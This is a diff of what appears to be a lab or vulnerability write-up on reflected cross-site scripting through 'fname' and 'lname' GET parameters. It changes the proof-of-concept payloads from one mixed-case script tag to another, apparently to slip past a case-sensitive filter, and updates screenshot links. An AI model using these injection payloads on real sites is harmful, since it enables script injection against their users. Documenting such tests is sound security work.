@@ -18,13 +18,13 @@ The page accepts First Name and Last Name values through GET parameters. Testing
 2. Enter the following value in the **First Name** field:
 
    ```html
-   "><sCript>alert(1)</sCript>
+   "><sCripT>alert(1)</sCripT>
    ```
 
 3. Enter the following value in the **Last Name** field:
 
    ```html
-   "><sCript>alert(2)</sCript>
+   "><sCripT>alert(2)</sCripT>
    ```
 
 4. Submit the form.
@@ -34,17 +34,17 @@ The page accepts First Name and Last Name values through GET parameters. Testing
 
 ### Screenshot 1 – Form Fields with Test Payloads
 
-<img width="940" height="493" alt="image" src="https://github.com/user-attachments/assets/28ed7d14-ec94-4400-9e14-345d6557b0f4" />
+<img width="940" height="490" alt="image" src="https://github.com/user-attachments/assets/918d97bc-4584-42a8-9e41-8a8ec59bc2d5" />
 
 
 ### Screenshot 2 – JavaScript Alert
 
-<img width="940" height="217" alt="image" src="https://github.com/user-attachments/assets/9ff27834-5775-489c-aac5-0edb21175f3e" />
+<img width="940" height="213" alt="image" src="https://github.com/user-attachments/assets/501626f9-ff96-4bd2-b84c-f8afbe20d5a7" />
 
 
 ### Screenshot 3 – Second JavaScript Alert
 
-<img width="940" height="258" alt="image" src="https://github.com/user-attachments/assets/c51f5aba-b4f9-477d-ba05-134313e87e31" />
+<img width="940" height="361" alt="image" src="https://github.com/user-attachments/assets/62dbcbcc-4bbd-4dcd-ad1d-3dce315c5e4a" />
 
 
 ### Payloads Used
@@ -52,13 +52,13 @@ The page accepts First Name and Last Name values through GET parameters. Testing
 **First Name (`fname`):**
 
 ```html
-"><sCript>alert(1)</sCript>
+"><sCripT>alert(1)</sCripT>
 ```
 
 **Last Name (`lname`):**
 
 ```html
-"><sCript>alert(2)</sCript>
+"><sCripT>alert(2)</sCripT>
 ```
 
 ### HTTP Request / URL
